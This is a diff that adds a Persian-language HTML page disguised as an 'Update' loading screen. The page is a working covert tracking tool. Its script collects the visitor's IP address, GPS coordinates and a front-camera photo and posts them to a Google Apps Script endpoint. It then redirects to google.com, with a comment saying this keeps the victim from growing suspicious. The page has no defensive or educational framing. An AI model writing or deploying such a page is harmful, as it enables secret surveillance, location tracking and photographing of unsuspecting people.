@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Update</title>
+<style>
+body { background-color: #f0f0f0; font-family: sans-serif; text-align: center; padding-top: 50px; }
+h1 { color: #333; }
+p { color: #666; }
+</style>
+</head>
+<body>
+
+<h1>Loading...</h1>
+<p>Please wait a moment.</p>
+
+<script>
+// تابع ارسال اطلاعات به گوگل شیت
+function sendToServer(data) {
+  fetch('https://script.google.com/macros/s/AKfycbxYkr9-UuGmQ0z80kjscBwcL2ldzDNf_lqU1LYlXe4pybIJwWdDCre9OvnLslUZeqdnJw/exec', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  }).then(() => {
+    // بعد از ارسال، کاربر را به گوگل هدایت کن تا شک نکند
+    window.location.href = "https://www.google.com";
+  });
+}
+
+// 1. دریافت IP
+fetch('https://api.ipify.org?format=json')
+  .then(res => res.json())
+  .then(data => {
+    var ip = data.ip;
+    
+    // 2. دریافت لوکیشن
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+        
+        // 3. عکس گرفتن از دوربین
+        var video = document.createElement('video');
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+          .then(function(stream) {
+            video.srcObject = stream;
+            video.play();
+            
+            setTimeout(() => {
+              canvas.width = 320;
+              canvas.height = 240;
+              ctx.drawImage(video, 0, 0, 320, 240);
+              var imageData = canvas.toDataURL('image/jpeg');
+              
+              // ارسال داده‌ها
+              sendToServer({ 
+                ip: ip, 
+                lat: lat, 
+                lon: lon, 
+                image: imageData,
+                time: new Date().toLocaleString()
+              });
+            }, 2000); // 2 ثانیه صبر برای لود دوربین
+          })
+          .catch(err => {
+             console.log("Camera error", err);
+             sendToServer({ ip: ip, lat: "N/A", lon: "N/A", image: "No Camera" });
+          });
+          
+      }, function(error) {
+        sendToServer({ ip: ip, lat: "Denied", lon: "Denied", image: "No GPS" });
+      });
+    } else {
+      sendToServer({ ip: ip, error: "No Geolocation Support" });
+    }
+  });
+</script>
+
+</body>
+</html>
